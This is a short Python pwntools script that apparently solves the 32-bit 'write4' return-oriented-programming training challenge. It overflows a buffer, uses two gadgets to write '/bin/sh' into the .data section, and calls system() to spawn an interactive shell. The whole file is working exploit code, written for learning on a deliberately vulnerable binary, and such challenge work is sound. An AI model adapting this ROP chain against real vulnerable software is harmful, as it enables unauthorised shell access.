#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('write432')
system_plt = elf.symbols['system']

# ROP Gadgets
gadget1 = 0x08048670  # mov dword ptr [edi], ebp ; ret
gadget2 = 0x080486da  # pop edi ; pop ebp ; ret

# buffer (use `readelf -a write432` and find a writeable section)
buf = 0x0804a028  # .data


if __name__ == '__main__':
    proc = elf.process()

    payload = 11 * b'AAAA'

    payload += p32(gadget2)
    payload += p32(buf)      # edi
    payload += b'/bin'       # ebp
    payload += p32(gadget1)  # write to buf

    payload += p32(gadget2)
    payload += p32(buf + 4)  # edi
    payload += b'/sh\x00'    # ebp
    payload += p32(gadget1)  # write to buf

    payload += p32(system_plt) + b'AAAA' + p32(buf)  # ret2 system("/bin/sh")

    proc.recvuntil('> ')
    proc.sendline(payload)
    proc.interactive()
